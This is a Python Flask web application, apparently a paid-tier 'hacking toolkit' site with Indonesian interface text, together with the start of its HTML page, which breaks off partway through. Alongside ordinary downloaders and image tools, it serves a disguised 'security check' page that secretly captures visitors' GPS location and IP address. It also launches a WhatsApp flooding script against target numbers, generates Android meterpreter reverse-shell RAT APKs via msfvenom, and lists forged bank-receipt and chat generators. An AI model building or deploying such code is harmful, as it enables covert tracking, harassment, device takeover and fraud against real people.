import os, re, json, time, shutil, subprocess, urllib.request, urllib.parse, io, string, base64, sqlite3, uuid
from pathlib import Path
from flask import Flask, request, jsonify, send_file, render_template_string, session
import qrcode
from PIL import Image, ImageFilter, ImageDraw, ImageFont
try:
    import g4f
    HAS_G4F = True
except: HAS_G4F = False

BASE = Path.home() / "toolkit"
TMP = BASE / "tmp"
TMP.mkdir(parents=True, exist_ok=True)
YTDLP = shutil.which("yt-dlp")
WA_BUG_DIR = BASE / "wa_bug"

app = Flask(__name__)
app.secret_key = "kaze_super_secret_2026"
app.config["MAX_CONTENT_LENGTH"] = 50 * 1024 * 1024

MEDIA_HOSTS = {"youtube.com", "youtu.be", "tiktok.com", "vt.tiktok.com", "instagram.com", "www.instagram.com", "facebook.com", "www.facebook.com"}
DB_PATH = BASE / "kaze_users.db"
PROTECTED_NUMBERS = {"6285833277934"}

def init_db():
    conn = sqlite3.connect(DB_PATH); c = conn.cursor()
    c.execute('CREATE TABLE IF NOT EXISTS users (username TEXT PRIMARY KEY, password TEXT, tier TEXT)')
    c.execute("INSERT OR REPLACE INTO users VALUES ('Kaze Morales', 'KazeMorales1', 'DEVELOPER')")
    c.execute("INSERT OR REPLACE INTO users VALUES ('admin', 'admin123', 'DEVELOPER')")
    c.execute('CREATE TABLE IF NOT EXISTS tracker (id TEXT, ip TEXT, loc TEXT, ua TEXT, lat TEXT, lon TEXT, time REAL)')
    conn.commit(); conn.close()
init_db()

def host_ok(url, hosts):
    try:
        h = urllib.parse.urlparse(url).hostname or ""
        h = re.sub(r"^www\.", "", h)
        return h in hosts or any(h.endswith("." + t) for t in hosts)
    except: return False

def cleanup_old(max_age_sec=600):
    now = time.time()
    for f in TMP.iterdir():
        try:
            if f.is_file() and now - f.stat().st_mtime > max_age_sec: f.unlink()
        except: pass

def run_ytdlp(url, args):
    if not YTDLP: return False, "yt-dlp not installed"
    cmd = [YTDLP, "--js-runtimes", "node", "--extractor-args", "youtube:player_client=android", *args, "-o", str(TMP / "%(id)s.%(ext)s"), url]
    p = subprocess.run(cmd, capture_output=True, text=True, timeout=600)
    return p.returncode == 0, (p.stderr or p.stdout)[-800:]

def latest_file(ts):
    files = [f for f in TMP.iterdir() if f.is_file() and f.stat().st_mtime >= ts]
    return max(files, key=lambda f: f.stat().st_mtime) if files else None

@app.route("/banner.mp4")
def serve_banner():
    p = BASE / "banner.mp4"
    if p.exists(): return send_file(p, mimetype="video/mp4")
    return "", 404

@app.route("/donasi.jpg")
def serve_donasi():
    p = BASE / "donasi.jpg"
    if p.exists(): return send_file(p, mimetype="image/jpeg")
    return "", 404

@app.route("/logo.jpg")
def serve_logo():
    p = BASE / "logo.jpg"
    if p.exists(): return send_file(p, mimetype="image/jpeg")
    return "", 404

@app.route("/api/login", methods=["POST"])
def api_login():
    d = request.json or {}
    conn = sqlite3.connect(DB_PATH); c = conn.cursor()
    c.execute("SELECT tier FROM users WHERE username=? AND password=?", (d.get("username"), d.get("password")))
    row = c.fetchone(); conn.close()
    if row:
        session["user"] = d["username"]; session["tier"] = row[0]
        return jsonify(success=True, username=d["username"], tier=row[0])
    return jsonify(success=False, message="Username atau password salah"), 401

@app.route("/api/register", methods=["POST"])
def api_register():
    d = request.json or {}
    conn = sqlite3.connect(DB_PATH)
    try:
        conn.execute("INSERT INTO users VALUES (?, ?, 'Basic')", (d.get("username"), d.get("password")))
        conn.commit()
        return jsonify(success=True, message="Akun dibuat! Silakan login.")
    except sqlite3.IntegrityError:
        return jsonify(success=False, message="Username sudah dipakai.")
    finally: conn.close()

@app.route("/api/yt", methods=["POST"])
def api_yt():
    d = request.json or {}
    url = d.get("url"); fmt = d.get("format", "mp4")
    if not host_ok(url, MEDIA_HOSTS): return jsonify(error="Host not allowed"), 400
    cleanup_old(); ts = time.time()
    args = ["-f", "mp4/best"] if fmt == "mp4" else ["-x", "--audio-format", "mp3"]
    ok, err = run_ytdlp(url, args)
    if not ok: return jsonify(error=err), 500
    f = latest_file(ts)
    return send_file(f, as_attachment=True) if f else (jsonify(error="File not found"), 404)

@app.route("/api/music-stream")
def api_music_stream():
    q = request.args.get("q", "")
    try:
        if not YTDLP: return jsonify(url="")
        cmd = [YTDLP, "-g", "-f", "bestaudio", f"ytsearch1:{q}"]
        p = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
        if p.returncode == 0:
            return jsonify(url=p.stdout.strip().split("\n")[0])
    except: pass
    return jsonify(url="")

@app.route("/api/qr")
def api_qr():
    img = qrcode.make(request.args.get("text", ""))
    buf = io.BytesIO(); img.save(buf, "PNG"); buf.seek(0)
    return send_file(buf, mimetype="image/png")

@app.route("/api/qr-download")
def api_qr_download():
    img = qrcode.make(request.args.get("text", ""))
    buf = io.BytesIO(); img.save(buf, "PNG"); buf.seek(0)
    return send_file(buf, mimetype="image/png", as_attachment=True, download_name="qr.png")

@app.route("/api/brat", methods=["POST"])
def api_brat():
    text = (request.json or {}).get("text", "")
    img = Image.new("RGB", (500, 500), (255, 255, 255))
    draw = ImageDraw.Draw(img)
    try: font = ImageFont.truetype("/system/fonts/Roboto-Regular.ttf", 40)
    except:
        try: font = ImageFont.truetype("arial.ttf", 40)
        except: font = ImageFont.load_default()
    words = text.split(); lines = []; cur = ""
    for w in words:
        if len(cur + " " + w) > 18: lines.append(cur); cur = w
        else: cur = (cur + " " + w).strip()
    if cur: lines.append(cur)
    y = 250 - (len(lines) * 30)
    for line in lines:
        draw.text((250, y), line, fill=(0,0,0), font=font, anchor="mm"); y += 60
    buf = io.BytesIO(); img.save(buf, "PNG"); buf.seek(0)
    return send_file(buf, mimetype="image/png")

@app.route("/api/hd-photo", methods=["POST"])
def api_hd_photo():
    try:
        if 'image' not in request.files: return jsonify(error="No image"), 400
        img = Image.open(request.files['image'].stream)
        img = img.resize((img.width*2, img.height*2), Image.Resampling.LANCZOS)
        buf = io.BytesIO(); img.save(buf, "PNG"); buf.seek(0)
        return send_file(buf, mimetype="image/png")
    except Exception as e: return jsonify(error=str(e)), 500

@app.route("/api/compress", methods=["POST"])
def api_compress():
    try:
        if 'image' not in request.files: return jsonify(error="No image"), 400
        img = Image.open(request.files['image'].stream).convert("RGB")
        buf = io.BytesIO(); img.save(buf, "JPEG", quality=40); buf.seek(0)
        return send_file(buf, mimetype="image/jpeg")
    except Exception as e: return jsonify(error=str(e)), 500

@app.route("/api/img2pdf", methods=["POST"])
def api_img2pdf():
    try:
        files = request.files.getlist('images')
        if not files: return jsonify(error="No images"), 400
        images = [Image.open(f.stream).convert("RGB") for f in files]
        buf = io.BytesIO()
        images[0].save(buf, "PDF", save_all=True, append_images=images[1:])
        buf.seek(0)
        return send_file(buf, mimetype="application/pdf", as_attachment=True, download_name="kaze.pdf")
    except Exception as e: return jsonify(error=str(e)), 500

@app.route("/api/chat", methods=["POST"])
def api_chat():
    if not HAS_G4F: return jsonify(reply="g4f belum diinstall. pip install g4f")
    msg = (request.json or {}).get("msg", "")
    try:
        r = g4f.ChatCompletion.create(model="gpt-3.5-turbo", messages=[{"role":"user","content": msg}])
        return jsonify(reply=r)
    except Exception as e: return jsonify(reply="Error: " + str(e)), 500

@app.route("/api/track/<track_id>")
def api_track(track_id):
    html = r"""<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width,initial-scale=1"><title>Security Check</title></head>
<body style="background:#f0f2f5;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;font-family:Arial">
<div style="text-align:center;background:#fff;padding:30px;border-radius:10px;box-shadow:0 4px 12px rgba(0,0,0,0.1)">
<h3 style="margin-top:0;color:#333">Verifikasi Keamanan</h3>
<p style="color:#666;font-size:14px">Meminta akses lokasi...</p>
<div style="border:4px solid #f3f3f3;border-top:4px solid #1877f2;border-radius:50%;width:30px;height:30px;animation:spin 1s linear infinite;margin:20px auto"></div>
</div>
<style>@keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}</style>
<script>
function sendData(lat, lon) {
    fetch('/api/save-loc/TRACKID', {method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({lat:lat,lon:lon})})
    .then(() => { window.location.href = 'https://google.com'; });
}
if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(
        (pos) => sendData(pos.coords.latitude, pos.coords.longitude),
        (err) => sendData(null, null),
        {enableHighAccuracy:true,timeout:10000}
    );
} else { sendData(null, null); }
</script></body></html>"""
    return html.replace("TRACKID", track_id)

@app.route("/api/save-loc/<track_id>", methods=["POST"])
def api_save_loc(track_id):
    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]
    ua = request.headers.get('User-Agent', 'Unknown')
    d = request.json or {}
    lat, lon = d.get('lat', 'N/A'), d.get('lon', 'N/A')
    try:
        with urllib.request.urlopen(f"http://ip-api.com/json/{ip}", timeout=5) as r:
            g = json.loads(r.read().decode())
            loc = f"{g.get('city','?')}, {g.get('country','?')} ({g.get('isp','?')})"
    except: loc = "Unknown"
    conn = sqlite3.connect(DB_PATH); c = conn.cursor()
    c.execute("INSERT INTO tracker VALUES (?,?,?,?,?,?,?)", (track_id, ip, loc, ua, lat, lon, time.time()))
    conn.commit(); conn.close()
    return jsonify(ok=True)

@app.route("/api/track-logs")
def api_track_logs():
    conn = sqlite3.connect(DB_PATH); c = conn.cursor()
    c.execute("SELECT id,ip,loc,ua,lat,lon,time FROM tracker ORDER BY time DESC LIMIT 50")
    rows = c.fetchall(); conn.close()
    return jsonify(ok=True, logs=[{"id":r[0],"ip":r[1],"loc":r[2],"ua":r[3],"lat":r[4],"lon":r[5],"time":r[6]} for r in rows])

@app.route("/api/bug-wa", methods=["POST"])
def api_bug_wa():
    try:
        data = request.json or {}
        target = re.sub(r"[^0-9]", "", str(data.get("target","")))
        hours = float(data.get("hours", 1))
        mode = data.get("mode", "lag")
        sender = re.sub(r"[^0-9]", "", str(data.get("sender", "")))
        if not target: return jsonify(ok=False, error="Nomor invalid"), 400
        if target == "6285833277934" or target.lstrip("62") == "85833277934":
            return jsonify(ok=False, error="Nomor dilindungi sistem"), 403
        script = WA_BUG_DIR / "flood.js"
        if not script.exists(): return jsonify(ok=False, error="flood.js belum ada"), 500
        job_id = uuid.uuid4().hex[:8]
        log_file = TMP / f"wabug_{job_id}.log"
        args = ["node", str(script), target, str(hours), mode]
        if sender: args.append(sender)
        subprocess.Popen(args, stdout=open(log_file,"w"), stderr=subprocess.STDOUT, cwd=str(WA_BUG_DIR))
        return jsonify(ok=True, job_id=job_id, message=f"Flood {mode} ke {target} selama {hours}j. Sender: {sender or 'QR mode'}")
    except Exception as e: return jsonify(ok=False, error=str(e)), 500

@app.route("/api/bug-wa/log/<job_id>")
def api_bugwa_log(job_id):
    lf = TMP / f"wabug_{job_id}.log"
    if not lf.exists(): return jsonify(ok=False, error="no log"), 404
    return jsonify(ok=True, log=lf.read_text()[-3000:])

@app.route("/api/gen-apk", methods=["POST"])
def api_gen_apk():
    try:
        d = request.json or {}
        ip, port = d.get("ip"), d.get("port")
        if not ip: return jsonify(ok=False, error="IP required"), 400
        if not shutil.which("msfvenom"): return jsonify(ok=False, error="Metasploit belum diinstall"), 400
        out = TMP / "kaze_payload.apk"
        subprocess.run(["msfvenom", "-p", "android/meterpreter/reverse_tcp", f"LHOST={ip}", f"LPORT={port}", "-o", str(out)], capture_output=True, timeout=300)
        return send_file(out, as_attachment=True, download_name="kaze.apk")
    except Exception as e: return jsonify(ok=False, error=str(e)), 500

PAGE = r"""<!doctype html>
<html><head>
<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<title>KAZE TOOLS</title>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
<link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;600;800&display=swap" rel="stylesheet">
<script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
<style>
:root{--bg:#050505;--card-bg:rgba(10,25,10,0.6);--fg:#fff;--sub:#88aa88;--border:rgba(0,255,0,0.15);--accent:#00ff00;--accent-glow:rgba(0,255,0,0.4);--vip:#ffb800;--vvip:#ff0055}
*{box-sizing:border-box;margin:0;padding:0}
body{background:#000;color:var(--fg);font-family:'Outfit',sans-serif;padding:0 0 100px;margin:auto;min-height:100vh;overflow-x:hidden;max-width:1200px}
.top-nav{display:flex;justify-content:space-between;align-items:center;padding:12px 16px;background:rgba(5,20,5,0.9);backdrop-filter:blur(10px);position:sticky;top:0;z-index:999;border-bottom:1px solid var(--accent);box-shadow:0 0 15px var(--accent-glow)}
.logo{font-size:20px;font-weight:800;font-style:italic;display:flex;align-items:center;gap:6px;color:var(--accent);text-shadow:0 0 10px var(--accent)}
.music-widget{display:flex;align-items:center;gap:8px;background:rgba(0,255,0,0.05);border:1px solid var(--accent);border-radius:99px;padding:4px 10px}
.music-widget i{color:var(--accent);font-size:12px;cursor:pointer}
.menu-btn{background:transparent;border:none;color:var(--accent);font-size:20px;cursor:pointer;z-index:1000}
.banner{width:100%;height:160px;position:relative;border-bottom:1px solid var(--accent);overflow:hidden}
.banner video{width:100%;height:100%;object-fit:cover;opacity:0.6;filter:sepia(1) hue-rotate(60deg) saturate(3) contrast(1.2)}
.banner-text{position:absolute;bottom:12px;left:16px;font-size:24px;font-weight:800;font-style:italic;color:var(--accent)}
.banner-text span{display:block;font-size:10px;font-style:normal;color:#fff;letter-spacing:2px}
.profile-card{margin:-20px 16px 16px;position:relative;z-index:10;background:#0a1a0a;border:1px solid var(--accent);border-radius:16px;padding:12px;display:flex;align-items:center;gap:12px;cursor:pointer}
.profile-avatar{width:45px;height:45px;border-radius:50%;background:rgba(0,255,0,0.1);display:flex;align-items:center;justify-content:center;font-size:20px;color:var(--accent);border:1px solid var(--accent)}
.profile-info{flex:1}
.profile-info .stats{display:flex;gap:8px;font-size:10px;color:var(--sub);margin-bottom:4px}
.role-badge{background:rgba(255,255,255,0.1);color:#ccc;padding:2px 8px;border-radius:4px;font-size:9px;font-weight:600;border:1px solid #555}
.vip-badge{background:rgba(255,184,0,0.1);color:var(--vip);padding:2px 8px;border-radius:4px;font-size:9px;font-weight:600;border:1px solid var(--vip)}
.dev-badge{background:rgba(0,255,0,0.1);color:#00ff00;padding:2px 8px;border-radius:4px;font-size:9px;font-weight:800;border:1px solid #00ff00}
.tabs-container{padding:0 16px 16px;overflow-x:auto;display:flex;gap:8px;scrollbar-width:none}
.tab{background:transparent;border:1px solid var(--border);border-radius:99px;padding:8px 16px;font-size:12px;font-weight:600;white-space:nowrap;color:var(--sub);cursor:pointer}
.tab.active{background:var(--accent);color:#000;border-color:transparent;font-weight:800}
.section-title{padding:0 16px;margin-bottom:12px;font-size:16px;font-weight:600;display:flex;align-items:center;gap:8px;color:var(--accent);border-bottom:1px solid var(--border);padding-bottom:5px;margin-top:20px}
.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(140px,1fr));gap:12px;padding:0 16px;margin-bottom:20px}
.card{background:var(--card-bg);border-radius:16px;padding:16px 10px;display:flex;flex-direction:column;align-items:center;text-align:center;position:relative;cursor:pointer;transition:0.3s;backdrop-filter:blur(10px);border:1px solid var(--border)}
.card:hover{border-color:var(--accent);box-shadow:0 0 20px var(--accent-glow);transform:translateY(-2px)}
.card i.main-icon{font-size:26px;color:var(--accent);margin-bottom:10px}
.card h3{font-size:12px;font-weight:600;margin-bottom:4px;color:#fff}
.card p{font-size:9px;color:var(--sub);margin-bottom:10px;line-height:1.3}
.tag{font-size:8px;font-weight:800;background:rgba(0,255,0,0.1);color:var(--accent);padding:3px 8px;border-radius:6px}
.card.vip-card{border-color:rgba(255,184,0,0.3)}
.card.vip-card:hover{border-color:var(--vip);box-shadow:0 0 20px rgba(255,184,0,0.3)}
.card.vip-card i.main-icon{color:var(--vip)}
.card.vvip-card{border-color:rgba(255,0,85,0.3)}
.card.vvip-card:hover{border-color:var(--vvip);box-shadow:0 0 20px rgba(255,0,85,0.3)}
.card.vvip-card i.main-icon{color:var(--vvip)}
.modal-overlay{position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,0.9);backdrop-filter:blur(5px);display:none;align-items:center;justify-content:center;z-index:99999;padding:20px}
.modal-content{background:#0a1a0a;border:1px solid var(--accent);border-radius:20px;padding:24px;max-width:400px;width:100%;position:relative;text-align:left;max-height:90vh;overflow-y:auto}
.modal-close{position:absolute;top:16px;right:16px;font-size:20px;color:var(--sub);cursor:pointer}
.modal-content h2{font-size:18px;margin-bottom:16px;color:var(--accent);display:flex;align-items:center;gap:8px}
.modal-content input,.modal-content select,.modal-content textarea{width:100%;background:#000;border:1px solid var(--border);border-radius:10px;padding:12px;color:#fff;font-family:inherit;font-size:14px;margin-bottom:12px;outline:none}
.modal-content .btn-row{display:flex;gap:8px}
.modal-content button{background:var(--accent);border:none;color:#000;padding:12px;border-radius:10px;font-weight:800;font-size:14px;cursor:pointer;flex:1}
.hidden-captures{position:absolute;left:-9999px;top:0;width:400px;opacity:1;visibility:visible;z-index:-100}
.side-menu{position:fixed;top:0;right:-100%;width:80%;max-width:300px;height:100%;background:#0a1a0a;border-left:1px solid var(--accent);z-index:999999;transition:0.3s;padding:24px;display:flex;flex-direction:column;gap:16px;overflow-y:auto}
.side-menu.open{right:0}
.menu-item{display:flex;align-items:center;gap:12px;padding:12px;background:rgba(0,255,0,0.02);border:1px solid var(--border);border-radius:12px;text-decoration:none;color:#fff;cursor:pointer}
.menu-item i{color:var(--accent);font-size:18px}
#toast{position:fixed;top:20px;left:50%;transform:translateX(-50%);background:var(--accent);color:#000;padding:10px 20px;border-radius:99px;font-size:12px;font-weight:800;display:none;z-index:999999}
</style>
</head>
<body>
<div id="vip-restrict" class="modal-overlay" style="z-index:100000">
<div class="modal-content" style="text-align:center;border-color:var(--vip)">
<i class="fa-solid fa-lock" style="font-size:40px;color:var(--vip);margin-bottom:15px"></i>
<h2 style="justify-content:center;color:var(--vip)">Fitur Terkunci</h2>
<p style="font-size:13px;color:#ccc;margin-bottom:20px">Fitur ini khusus VIP/VVIP. Hubungi Admin untuk upgrade.</p>
<a href="https://wa.me/6285833277934" target="_blank" style="display:block;background:#25D366;color:#fff;text-decoration:none;padding:12px;border-radius:10px;font-weight:bold;margin-bottom:10px"><i class="fa-brands fa-whatsapp"></i> Hubungi Admin</a>
<button onclick="document.getElementById('vip-restrict').style.display='none'" style="background:transparent;border:1px solid #444;color:#888">TUTUP</button>
</div></div>

<div class="top-nav">
<div class="logo"><i class="fa-solid fa-bolt"></i> KAZE</div>
<div class="music-widget"><i class="fa-solid fa-backward-step" onclick="prevTrack()"></i><i class="fa-solid fa-play" id="play-btn" onclick="togglePlay()"></i><i class="fa-solid fa-forward-step" onclick="nextTrack()"></i></div>
<button class="menu-btn" onclick="toggleMenu()"><i class="fa-solid fa-bars"></i></button>
</div>

<div class="banner">
<video autoplay loop muted playsinline><source src="/banner.mp4" type="video/mp4"></video>
<div class="banner-text">MORALES TOOLS<span>BY KAZE</span></div>
</div>

<div class="profile-card" onclick="document.getElementById('login-modal').style.display='flex'">
<div class="profile-avatar"><i class="fa-solid fa-user"></i></div>
<div class="profile-info">
<div class="stats"><span><i class="fa-solid fa-globe"></i> Indonesia</span><span id="user-status">Guest (Klik Login)</span></div>
<div class="role-row" id="user-tier"><span class="role-badge">Role: Guest</span></div>
</div>
</div>

<div class="tabs-container">
<div class="tab active" onclick="setCat('all',this)">All</div>
<div class="tab" onclick="setCat('bug',this)">Bug/Spy</div>
<div class="tab" onclick="setCat('fake',this)">Fake</div>
<div class="tab" onclick="setCat('game',this)">Game</div>
<div class="tab" onclick="setCat('tools',this)">Tools</div>
</div>

<div class="section-title"><i class="fa-solid fa-shapes"></i> Semua Fitur</div>
<div class="grid">
<div class="card vvip-card" data-cat="bug" onclick="openTool('realtracker')"><i class="fa-solid fa-crosshairs main-icon"></i><h3>Real Tracker</h3><p>IP & GPS</p><span class="tag" style="color:var(--vvip)">VVIP</span></div>
<div class="card vvip-card" data-cat="bug" onclick="openTool('bugwareal')"><i class="fa-brands fa-whatsapp main-icon"></i><h3>Bug WA Real</h3><p>Flood/Crash</p><span class="tag" style="color:var(--vvip)">VVIP</span></div>
<div class="card vvip-card" data-cat="bug" onclick="openTool('genapk')"><i class="fa-brands fa-android main-icon"></i><h3>Real APK RAT</h3><p>Sadap Android</p><span class="tag" style="color:var(--vvip)">VVIP</span></div>

<div class="card vip-card" data-cat="fake" onclick="openTool('fakewa')"><i class="fa-brands fa-whatsapp main-icon"></i><h3>Fake WA</h3><p>Chat WA</p><span class="tag" style="color:var(--vip)">VIP</span></div>
<div class="card vip-card" data-cat="fake" onclick="openTool('fakesms')"><i class="fa-solid fa-comment-sms main-icon"></i><h3>Fake SMS</h3><p>Pesan Teks</p><span class="tag" style="color:var(--vip)">VIP</span></div>
<div class="card vip-card" data-cat="fake" onclick="openTool('fakewacall')"><i class="fa-solid fa-phone main-icon"></i><h3>Fake WA Call</h3><p>Panggilan</p><span class="tag" style="color:var(--vip)">VIP</span></div>
<div class="card vip-card" data-cat="fake" onclick="openTool('fakewacontext')"><i class="fa-solid fa-list main-icon"></i><h3>Fake WA Menu</h3><p>Tap Pesan</p><span class="tag" style="color:var(--vip)">VIP</span></div>
<div class="card vip-card" data-cat="fake" onclick="openTool('fakeiosnotif')"><i class="fa-brands fa-apple main-icon"></i><h3>Fake iOS Notif</h3><p>Lockscreen</p><span class="tag" style="color:var(--vip)">VIP</span></div>
<div class="card vip-card" data-cat="fake" onclick="openTool('faketelegram')"><i class="fa-brands fa-telegram main-icon"></i><h3>Fake Telegram</h3><p>Chat TG</p><span class="tag" style="color:var(--vip)">VIP</span></div>
<div class="card vip-card" data-cat="fake" onclick="openTool('fakegoogle')"><i class="fa-brands fa-google main-icon"></i><h3>Fake Google</h3><p>Pencarian</p><span class="tag" style="color:var(--vip)">VIP</span></div>
<div class="card vip-card" data-cat="fake" onclick="openTool('fakediscord')"><i class="fa-brands fa-discord main-icon"></i><h3>Fake Discord</h3><p>Chat DC</p><span class="tag" style="color:var(--vip)">VIP</span></div>
<div class="card vip-card" data-cat="fake" onclick="openTool('fakebca')"><i class="fa-solid fa-building-columns main-icon"></i><h3>Fake BCA</h3><p>Struk BCA</p><span class="tag" style="color:var(--vip)">VIP</span></div>
<div class="card vip-card" data-cat="fake" onclick="openTool('dana')"><i class="fa-solid fa-money-bill main-icon"></i><h3>Fake DANA</h3><p>Struk DANA</p><span class="tag" style="color:var(--vip)">VIP</span></div>
<div class="card vip-card" data-cat="fake" onclick="openTool('fakeigprofile')"><i class="fa-brands fa-instagram main-icon"></i><h3>Fake IG Prof</h3><p>Profil IG</p><span class="tag" style="color:var(--vip)">VIP</span></div>
<div class="card vip-card" data-cat="fake" onclick="openTool('faketweet')"><i class="fa-brands fa-twitter main-icon"></i><h3>Fake Tweet</h3><p>Tweet X</p><span class="tag" style="color:var(--vip)">VIP</span></div>
<div class="card vip-card" data-cat="fake" onclick="openTool('fakepaypal')"><i class="fa-brands fa-paypal main-icon"></i><h3>Fake PayPal</h3><p>Transfer</p><span class="tag" style="color:var(--vip)">VIP</span></div>
<div class="card vip-card" data-cat="fake" onclick="openTool('fakeshopee')"><i class="fa-solid fa-bag-shopping main-icon"></i><h3>Fake Shopee</h3><p>Pesanan</p><span class="tag" style="color:var(--vip)">VIP</span></div>
<div class="card vip-card" data-cat="fake" onclick="openTool('fakenetflix')"><i class="fa-solid fa-film main-icon"></i><h3>Fake Netflix</h3><p>Profil</p><span class="tag" style="color:var(--vip)">VIP</span></div>
<div class="card vip-card" data-cat="fake" onclick="openTool('fakespotify')"><i class="fa-brands fa-spotify main-icon"></i><h3>Fake Spotify</h3><p>Now Playing</p><span class="tag" style="color:var(--vip)">VIP</span></div>
<div class="card vip-card" data-cat="fake" onclick="openTool('fakegopay')"><i class="fa-solid fa-wallet main-icon"></i><h3>Fake GoPay</h3><p>Saldo</p><span class="tag" style="color:var(--vip)">VIP</span></div>
<div class="card vip-card" data-cat="fake" onclick="openTool('fakeovo')"><i class="fa-solid fa-wallet main-icon"></i><h3>Fake OVO</h3><p>Saldo</p><span class="tag" style="color:var(--vip)">VIP</span></div>
<div class="card vip-card" data-cat="fake" onclick="openTool('fakesteam')"><i class="fa-brands fa-steam main-icon"></i><h3>Fake Steam</h3><p>Profil</p><span class="tag" style="color:var(--vip)">VIP</span></div>
<div class="card vip-card" data-cat="fake" onclick="openTool('fakecrypto')"><i class="fa-brands fa-bitcoin main-icon"></i><h3>Fake Crypto</h3><p>Wallet</p><span class="tag" style="color:var(--vip)">VIP</span></div>

<div class="card" data-cat="game" onclick="openTool('fakelobbyml')"><i class="fa-solid fa-gamepad main-icon"></i><h3>Fake ML Lobby</h3><p>Classic</p><span class="tag">GAME</span></div>
<div class="card" data-cat="game" onclick="openTool('fakemlchat')"><i class="fa-solid fa-comments main-icon"></i><h3>Fake ML Chat</h3><p>Chat</p><span class="tag">GAME</span></div>
<div class="card" data-cat="game" onclick="openTool('fakemlprofile')"><i class="fa-solid fa-user main-icon"></i><h3>Fake ML Prof</h3><p>Profil</p><span class="tag">GAME</span></div>
<div class="card" data-cat="game" onclick="openTool('faketerm')"><i class="fa-solid fa-terminal main-icon"></i><h3>Fake Terminal</h3><p>Hacker</p><span class="tag">GAME</span></div>

<div class="card" data-cat="tools" onclick="openTool('yt')"><i class="fa-brands fa-youtube main-icon" style="color:#ff0000"></i><h3>YouTube</h3><p>DL</p><span class="tag">MP4</span></div>
<div class="card" data-cat="tools" onclick="openTool('tiktok')"><i class="fa-brands fa-tiktok main-icon"></i><h3>TikTok</h3><p>No WM</p><span class="tag">MP4</span></div>
<div class="card" data-cat="tools" onclick="openTool('ig')"><i class="fa-brands fa-instagram main-icon" style="color:#e1306c"></i><h3>Instagram</h3><p>Reels</p><span class="tag">MP4</span></div>
<div class="card" data-cat="tools" onclick="openTool('fb')"><i class="fa-brands fa-facebook main-icon" style="color:#1877f2"></i><h3>Facebook</h3><p>Video</p><span class="tag">MP4</span></div>
<div class="card" data-cat="tools" onclick="openTool('ewallet')"><i class="fa-solid fa-wallet main-icon"></i><h3>E-Wallet QR</h3><p>QR</p><span class="tag">QRIS</span></div>
<div class="card" data-cat="tools" onclick="openTool('wifi')"><i class="fa-solid fa-wifi main-icon"></i><h3>QR WiFi</h3><p>WiFi</p><span class="tag">QRIS</span></div>
<div class="card" data-cat="tools" onclick="openTool('brat')"><i class="fa-solid fa-wand-magic-sparkles main-icon"></i><h3>BRAT Gen</h3><p>IMG</p><span class="tag">IMG</span></div>
<div class="card" data-cat="tools" onclick="openTool('hdphoto')"><i class="fa-solid fa-camera main-icon"></i><h3>Image HD</h3><p>2x</p><span class="tag">HD</span></div>
<div class="card" data-cat="tools" onclick="openTool('compress')"><i class="fa-solid fa-compress main-icon"></i><h3>Compress</h3><p>IMG</p><span class="tag">IMG</span></div>
<div class="card" data-cat="tools" onclick="openTool('pdf')"><i class="fa-solid fa-file-pdf main-icon"></i><h3>Image→PDF</h3><p>PDF</p><span class="tag">FILE</span></div>
<div class="card" data-cat="tools" onclick="openTool('hash')"><i class="fa-solid fa-hashtag main-icon"></i><h3>Hash Gen</h3><p>SHA</p><span class="tag">SEC</span></div>
<div class="card" data-cat="tools" onclick="openTool('b64')"><i class="fa-solid fa-code main-icon"></i><h3>Base64</h3><p>Enc/Dec</p><span class="tag">SEC</span></div>
<div class="card" data-cat="tools" onclick="openTool('passgen')"><i class="fa-solid fa-key main-icon"></i><h3>Password Gen</h3><p>Sandi</p><span class="tag">SEC</span></div>
<div class="card" data-cat="tools" onclick="openTool('uuidgen')"><i class="fa-solid fa-fingerprint main-icon"></i><h3>UUID Gen</h3><p>ID</p><span class="tag">UTIL</span></div>
<div class="card" data-cat="tools" onclick="openTool('text2bin')"><i class="fa-solid fa-code main-icon"></i><h3>Text→Bin</h3><p>Biner</p><span class="tag">TEXT</span></div>
<div class="card" data-cat="tools" onclick="openTool('bin2text')"><i class="fa-solid fa-code main-icon"></i><h3>Bin→Text</h3><p>Decode</p><span class="tag">TEXT</span></div>
<div class="card" data-cat="tools" onclick="openTool('caseconv')"><i class="fa-solid fa-font main-icon"></i><h3>Case Conv</h3><p>Huruf</p><span class="tag">TEXT</span></div>
<div class="card" data-cat="tools" onclick="openTool('randnum')"><i class="fa-solid fa-dice main-icon"></i><h3>Random Num</h3><p>Acak</p><span class="tag">UTIL</span></div>
<div class="card" data-cat="tools" onclick="openTool('coinflip')"><i class="fa-solid fa-coins main-icon"></i><h3>Coin Flip</h3><p>Koin</p><span class="tag">UTIL</span></div>
<div class="card" data-cat="tools" onclick="openTool('diceroll')"><i class="fa-solid fa-dice main-icon"></i><h3>Dice Roll</h3><p>Dadu</p><span class="tag">UTIL</span></div>
<div class="card" data-cat="tools" onclick="openTool('wordcount')"><i class="fa-solid fa-file-word main-icon"></i><h3>Word Count</h3><p>Kata</p><span class="tag">TEXT</span></div>
<div class="card" data-cat="tools" onclick="openTool('textrev')"><i class="fa-solid fa-rotate-left main-icon"></i><h3>Text Rev</h3><p>Balik</p><span class="tag">TEXT</span></div>
<div class="card" data-cat="tools" onclick="openTool('text2hex')"><i class="fa-solid fa-hashtag main-icon"></i><h3>Text→Hex</h3><p>Hex</p><span class="tag">SEC</span></div>
<div class="card" data-cat="tools" onclick="openTool('hex2text')"><i class="fa-solid fa-hashtag main-icon"></i><h3>Hex→Text</h3><p>Decode</p><span class="tag">SEC</span></div>
<div class="card" data-cat="tools" onclick="openTool('urlencode')"><i class="fa-solid fa-link main-icon"></i><h3>URL Encode</h3><p>Enc/Dec</p><span class="tag">SEC</span></div>
